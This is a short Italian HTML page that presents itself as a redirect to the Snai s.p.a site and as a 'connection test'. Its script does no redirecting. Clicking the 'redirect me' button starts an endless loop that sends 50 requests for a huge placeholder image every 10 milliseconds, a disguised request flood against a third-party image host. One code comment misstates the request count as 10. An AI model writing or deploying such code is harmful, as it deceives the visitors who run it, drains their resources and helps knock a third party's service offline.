<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test di Connessione</title>
</head>
<body>
    <h1>Rendirizzamento al sito Snai s.p.a</h1>
    <button id="start">Reindirizzami</button>
    <button id="stop">Ferma Test</button>
    <p id="status">Stato: Inattivo</p>
    <script>
        let intervalId = null;

        document.getElementById('start').addEventListener('click', () => {
            const status = document.getElementById('status');
            status.textContent = "Stato: Attivo";

            
            intervalId = setInterval(() => {
                for (let i = 0; i < 50; i++) { // Invia 10 richieste simultaneamente
                    fetch('https://via.placeholder.com/7680x4320.jpg');
                }
            }, 10);
        });

        document.getElementById('stop').addEventListener('click', () => {
            clearInterval(intervalId);
            const status = document.getElementById('status');
            status.textContent = "Stato: Inattivo";
        });
    </script>
</body>
</html>
